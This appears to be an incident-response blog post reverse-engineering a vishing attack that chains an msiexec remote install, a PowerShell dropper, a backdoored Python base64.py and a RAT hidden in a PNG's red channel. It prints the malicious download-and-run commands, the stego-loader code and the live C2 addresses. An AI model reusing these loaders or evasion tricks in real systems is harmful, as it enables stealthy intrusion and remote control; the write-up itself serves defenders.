Five Stages of Steganography: Reversing a RAT Hidden in PNG Pixels

2026-03-18 · ~18 min read
IR DFIR malware

This is the one I keep coming back to. A Cloud IOC fires on a medium-severity msiexec event, and five stages later I'm staring at 90,000 characters of RAT source code extracted from the red channel of a PNG file. The attacker replaced Python's own base64.py to hide the whole thing in plain sight. Here's the full chain, from the social engineering hook to the steganographic payload.

Names, hostnames, and organizational details have been sanitized. The attacker domain and infrastructure are shown as-is.

The Attack Chain

Initial Detection

Cisco Secure Endpoint fired a Cloud IOC — W32.MSIExecRemoteInstall.ioc, Medium severity. The alert flagged someone running msiexec with a remote URL, which is suspicious on its own. But the specifics made it worse: the command was executed through the Win+R Run dialog, and the target URL pointed to an external domain none of us had ever seen.

The user was a new hire in social services, about 7 weeks on the job.

The Social Engineering

Here's the command the user pasted into the Run dialog:

msIeXEC.exe /paCkAGE http:\\sendtokenscf[.]com\system32\..\Verification\..\UserID466943 /Q

Let's break down the evasion techniques packed into this one line:

  • Mixed casing — msIeXEC, /paCkAGE. Bypasses naive string matching while Windows happily ignores case.
  • Backslashes instead of forward slashes in the URL — http:\\ instead of http://. Windows resolves this correctly. Some URL parsers and filters don't.
  • Path traversal that cancels itself — \system32\..\Verification\..\UserID466943 resolves to just \UserID466943. The system32 and Verification path components exist purely to make it look legitimate.
  • /Q flag — silent install. No UI, no prompts, no evidence on screen.
  • "Verification" and "UserID466943" — designed to look like a routine IT identity verification step. Exactly the kind of thing a new hire would expect.

Then I checked the RunMRU registry key. This is where Windows stores everything typed into the Win+R Run dialog. The user's RunMRU had only two complete entries, and both were the malicious msiexec command. There was also a partial third attempt — the same command, truncated. No other Run history at all.

Two complete entries plus a partial third attempt, with zero other Run history, is consistent with someone being coached through the process in real time — likely over the phone. The first attempt probably failed or appeared to hang silently (/Q gives no feedback), so they were told to try again.

We never definitively proved the delivery method. Email logs were clean. Teams was unused. No remote access tools were found. No browser history of sendtokenscf[.]com. USB artifacts were clean. Everything points to a phone call — a vishing attack — but we couldn't prove it. A new hire, 7 weeks in, still learning what's normal, gets a call from "IT" asking them to run a verification command. It's a textbook play.

Stage 1 — The MSI

The MSI was tiny — just 32 KB. I pulled it apart and the metadata told a story:

PropertyValue
Product NamePowershellCleaner

Same-day build. The attacker wrote cleaner.ps1 at 8:32 AM, packaged it into the MSI at 9:37 AM, and the user ran it at 2:19 PM. A five-hour turnaround from payload creation to execution. The MSI was built fresh for this specific attack.

Inside the MSI, a CustomAction at install sequence 6601 auto-runs cleaner.ps1 via a hidden PowerShell process with -ExecutionPolicy Bypass. The MSI is just a delivery vehicle — install it, run the script, done.

MSI metadata is forensically rich. Build timestamps, tooling versions, product GUIDs, author names — the attacker left their build environment fingerprint in the installer. "CCATechnology" and "PowershellCleaner" are almost certainly reused across campaigns.

Stage 2 — The Dropper

cleaner.ps1 was 1,117 bytes. The obfuscation was straightforward — an integer array that gets converted to a character string and piped to iex (Invoke-Expression):

# Obfuscated form (truncated):
$arr = @(73,69,88,...); $s = ''; foreach($i in $arr){ $s += [char]$i }; iex $s

Decoded, it was simple:

# Downloads zip from Dropbox
$url = "https://dl.dropboxusercontent[.]com/s/[redacted]/wpython.zip"
$dest = "$env:APPDATA\WPy64-31401"
Invoke-WebRequest -Uri $url -OutFile "$dest\wpython.zip"
Expand-Archive -Path "$dest\wpython.zip" -DestinationPath $dest -Force
Start-Process "$dest\pythonw.exe" -ArgumentList "$dest\nlib.py" -WindowStyle Hidden

Download a zip from Dropbox, extract it to %APPDATA%\WPy64-31401\ (mimicking a legitimate WinPython installation path), and silently launch pythonw.exe nlib.py. The pythonw.exe binary runs Python without a console window — no visible process window for the user to notice.

Stage 3 — The Trojanized Python

The Dropbox zip contained a full WinPython distribution. Legitimate Python interpreter, legitimate standard library, legitimate directory structure. Everything you'd expect from a normal portable Python install. With one critical modification.

We'll get to that modification in a moment. First, the launcher.

Stage 4 — The Supply Chain Trick

This is where it gets clever.

nlib.py was over 500 lines of what looked like garbage. Standard library test functions — string manipulation, math operations, list comprehensions — all with 40-to-80-character randomized variable names. Scrolling through it, your eyes glaze over. It looks like someone dumped a bunch of junk stdlib tests into a file. A defender doing a quick scan would move on.

But line 513:

result = base64.z85encode(b"placeholder")
exec(result)

That looks wrong. z85encode() returns bytes, not executable code. And you don't exec() the result of an encoding function. Something is off.

Here's the trick: Python's own base64.py in the Lib/ directory had been replaced with a backdoored version.

The attacker took the real base64.py from CPython's standard library and rewrote the z85encode() function. Instead of performing Z85 encoding, it now does this:

def z85encode(data):
    # 1. Open background1.png from a subdirectory
    png_path = os.path.join(os.path.dirname(__file__), 'data', 'background1.png')
    with open(png_path, 'rb') as f:
        png_data = f.read()

    # 2. Parse PNG chunks manually (IHDR, IDAT, IEND)
    chunks = []
    offset = 8  # skip PNG signature
    while offset < len(png_data):
        length = int.from_bytes(png_data[offset:offset+4], 'big')
        chunk_type = png_data[offset+4:offset+8]
        chunk_data = png_data[offset+8:offset+8+length]
        chunks.append((chunk_type, chunk_data))
        offset += 12 + length
        if chunk_type == b'IEND':
            break

    # 3. Decompress IDAT pixel data via zlib
    idat_data = b''.join(d for t, d in chunks if t == b'IDAT')
    raw_pixels = zlib.decompress(idat_data)

    # 4. Extract ASCII characters from the red channel
    extracted = ''
    for pixel_byte in raw_pixels:
        if 32 <= pixel_byte <= 126:  # printable ASCII range
            extracted += chr(pixel_byte)

    return extracted  # returns executable Python source code

Read that again. The function signature is z85encode(). It's part of base64.py. Any import of base64 loads it automatically. When nlib.py calls base64.z85encode(), Python doesn't download anything, doesn't import suspicious modules, doesn't touch the network. It opens a local PNG file, parses the pixel data, and returns a string. Then nlib.py calls exec() on that string.

This is a supply-chain attack on the Python standard library itself. Instead of importing suspicious modules or adding new files that might get flagged, the attacker modified a trusted module that ships with every Python installation. No new imports. No unusual file access patterns. Just import base64 — something that appears in millions of legitimate Python scripts.

Stage 5 — The Steganography

And now the payload.

background1.png was 4.9 MB. Open it in an image viewer and it looks like a generic desktop wallpaper — dark gradient, vaguely abstract. Nothing suspicious. It would pass any manual review. It would pass most automated scanning too, because the file is a perfectly valid PNG with correct headers, correct chunks, correct checksums.

But each pixel's red channel contains one ASCII character.

I wrote a script to extract it:

from PIL import Image
import sys

img = Image.open('background1.png')
pixels = img.load()
width, height = img.size

payload = ''
for y in range(height):
    for x in range(width):
        r, g, b, *_ = pixels[x, y]
        if 32 <= r <= 126:  # printable ASCII
            payload += chr(r)

print(f"Extracted {len(payload)} characters")
with open('extracted_rat.py', 'w') as f:
    f.write(payload)
$ python extract.py
Extracted 90125 characters

90,125 characters. A fully functional async RAT, written in Python, hidden in the red channel of a wallpaper image. Let that sink in for a second. You could run this PNG through VirusTotal, through any AV engine, through a sandbox — it's a valid image. The malicious content is only revealed when you parse the pixel data as text.

The RAT Capabilities

The extracted code was a complete asynchronous remote access trojan:

  • RC4 encryption for all C2 communications
  • Protocol magic bytes \xfe\xfe\x00\x01 prepended to every message
  • HTTP POST beaconing to /beacon/{agent_id} on port 80
  • Dual C2 servers — 138.68.15.116 (DigitalOcean) and 67.217.228.8 (BitLaunch) with automatic failover
  • System reconnaissance — MAC address, hostname, ARP table, running processes
  • Command execution via hidden PowerShell with CREATE_NO_WINDOW
  • Scheduled task persistence — daily trigger, runs as SYSTEM
  • SSL certificate verification bypass for C2 comms
  • Process hiding — runs via pythonw.exe with both CREATE_NO_WINDOW and DETACHED_PROCESS flags

The use of pythonw.exe is deliberate — it's Python's "windowless" interpreter, designed for GUI applications that don't need a console. Running the RAT through it means no command prompt window ever appears, and the process name in Task Manager is just pythonw.exe, which looks benign on any machine with Python installed.

Persistence Mechanisms

The RAT set up a layered persistence chain:

  1. script.vbs — a VBScript wrapper that launches pythonw.exe via a hidden PowerShell process with a 3-second sleep delay (likely to avoid racing with system startup)
  2. MemoryChecker.lnk — a shortcut placed in the Startup folder, pointing to script.vbs
  3. Scheduled task — daily execution as SYSTEM for persistence even if the Startup folder is cleaned

One detail stood out: the MemoryChecker.lnk shortcut pointed to the Administrator profile path, not the user's profile path. The user who ran the msiexec command was not a local admin. This means the malware — or the attacker interactively — obtained elevated privileges at some point after initial execution. The MSI's /Q silent install running through msiexec under the user's context shouldn't have had admin access. Something escalated.

Proving the Infection Vector

One of the most important parts of any IR is definitively proving how the infection happened. "The user probably ran a command" isn't good enough for a report. I needed proof. Four independent artifact sources gave me that proof.

RunMRU Registry

HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

MRUList: ba
a: msIeXEC.exe /paCkAGE http:\\sendtokenscf[.]com\system32\..
   \Verification\..\UserID466943 /Q\1
b: msIeXEC.exe /paCkAGE http:\\sendtokenscf[.]com\system32\..
   \Verification\..\UserID466943 /Q\1

Only two entries ever recorded in the Run dialog. Both are the malicious command. No other Run history on this machine, ever.

UserAssist

HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist

msiexec.exe
  Last Executed: 2:22 PM
  Run Count: 3
  Focus Time: 0 ms

FocusMs: 0 is significant — it means the process window never had focus. Consistent with the /Q silent flag. The user never saw a window.

BAM (Background Activity Moderator)

SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\{user SID}

powershell.exe    2:19 PM
msiexec.exe       2:19 PM

PowerShell and msiexec executing back-to-back under the user's SID, at the exact timestamp the MSI was downloaded.

Prefetch Chain

MSEDGE.EXE-*.pf        (browser active before infection)
POWERSHELL.EXE-*.pf    (Stage 2 execution)
DLLHOST.EXE-*.pf       (MSI helper process)
MSIEXEC.EXE-*.pf       (Stage 1 MSI install)

Device Trajectory

Cisco Secure Endpoint's device trajectory showed the parent process of msiexec.exe was explorer.exe. When you run something from the Win+R Run dialog, explorer.exe is always the parent. If it had been launched from a script or another process, the parent would be different.

Four independent artifacts, one story. RunMRU shows what was typed. UserAssist shows when it ran and that it was silent. BAM confirms execution under the user's SID. Prefetch shows the process chain. Device trajectory confirms explorer.exe as parent. This is airtight.

What We Couldn't Determine

Despite all of this, we never proved how the user received the command to paste. Email logs across all platforms were clean. Teams wasn't in use. No remote access tools were installed. Browser history didn't contain sendtokenscf[.]com — the user never visited the domain directly, only passed it to msiexec. USB forensics came up empty.

The most likely scenario is vishing — a phone call. Someone called the user, posed as IT, and walked them through the "verification" step. The evidence supports this: the RunMRU showing multiple attempts is consistent with someone being talked through a process when the first try doesn't produce visible results (because /Q suppresses all UI). The user was a new hire, 7 weeks in, still building mental models of what's normal and what isn't. "IT needs you to verify your workstation" is completely plausible in that context.

But "most likely" isn't "confirmed." Without call logs or the user's admission, the delivery mechanism remains unproven.

The Lesson That Still Stings

The machine was wiped before a forensic image was taken. All of the analysis above was performed live via C$ admin share — remoting into the filesystem while the machine was still running. The malware artifacts, the steganographic PNG, the trojanized base64.py, the 90,125-character RAT source code — all documented in the incident report but never preserved as files. When the machine was wiped, they were gone. Permanently. I wrote about every stage in detail, but I can't hand anyone the actual artifacts. Image first, investigate second. Always.

Key Takeaways

  • Supply-chain attacks can target the Python standard library. Replacing base64.py is brilliant — no suspicious imports, no new files, just a modified trusted module. If you're analyzing a trojanized Python distribution, don't just look at the scripts. Diff the standard library against a known-good copy.
  • PNG steganography hides 90K characters in plain sight. The file looks like a normal background image. It opens correctly. It has valid headers and checksums. Traditional file scanning and even sandbox analysis won't catch it because the file isn't malicious — the data is.
  • MSI metadata is forensically rich. Build timestamps, tooling versions, manufacturer strings, product GUIDs — the attacker left their build environment fingerprint in the MSI. Cross-reference these against known campaigns.
  • RunMRU + UserAssist + BAM + Prefetch = definitive proof of execution method. Four independent artifacts corroborating the same story. Any single one could be questioned. All four together are conclusive.
  • Image before you investigate. You can always analyze an image later. You can't image a wiped machine. The investigation will still be there tomorrow. The disk might not be.
  • New hires are high-value social engineering targets. Seven weeks on the job, still learning what's normal, unlikely to question "IT verification." Onboarding security awareness training needs to happen on day one, not day thirty.
